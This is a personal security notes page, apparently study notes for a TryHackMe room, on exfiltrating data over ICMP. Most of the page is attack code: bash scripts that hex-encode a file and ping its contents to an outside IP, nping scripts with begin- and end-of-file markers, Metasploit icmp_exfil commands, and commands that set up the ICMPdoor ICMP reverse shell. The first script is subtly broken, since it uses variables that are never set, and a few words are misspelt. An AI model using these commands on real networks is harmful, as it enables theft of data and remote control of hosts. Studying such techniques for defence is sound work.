# Data Exfiltration Over ICMP

Use of the [[Internet-Control-Messaging-Protocol]]'s Data section and sending it via `ICMP` to exfiltration target location outside the network.

A simple bash script, but remember to start packet capture before running!
```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
        echo "Usage: $0 <file path> <IP address>"
        exit
fi

data=$(cat $filepath)
for line in $data; do
	foricmp=$(echo $line | xxd -p)
	ping $ip -c 1 -p $foricmp
done
```

## Metasploit

[[Metasploit]] can perform ICMP data exfiltration with the `auxilirary/server/icmp_exfil` module

```ruby
msfX > use auxiliary/server/icmp_exfil
# Set the BPF_FILTER option
# This based on TCPDUMP rules - capture only packet from Data host
set BPF_FILTER icmp and not src <attacker-ip>
set INTERFACE # to some interface recieve the data
```
On Data host, `nping` is default ICMP transmitter
```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
        echo "Usage: $0 <file path> <IP address>"
        exit
fi

data=$(cat $1)
sudo nping --icmp -c 1 $2 --data-string "BOFfile.txt"
for line in $data; do
        sudo nping --icmp -c 1 $2 --data-string "$line"
done
sudo nping --icmp -c 1 $2 --data-string "EOFfile.txt"
exit
```

It acommplishes this by capturing the incoming ICMP packets and wait for Beginning of File trigger value then writes to disk until it recieves a End of File trigger value.


## C2 ICMP Exfiltration


[ICMPdoor](https://github.com/krabelize/icmpdoor) is *"ICMP Reverse Shell written in Python 3 and with Scapy (backdoor/rev shell)"*. Similarly to the previous methods the C2 utilizes the Data section within the ICMP packet to exfiltrate data.

```bash
# Victim Box:
sudo icmpdoor -i <interface> -d <destination-ip> &
# Destination Box:
sudo icmp-cnc -i <interface> -d <victim-ip>
# This spawns a shell
```


## References

[THM Data Exfiltration](https://tryhackme.com/room/dataxexfilt)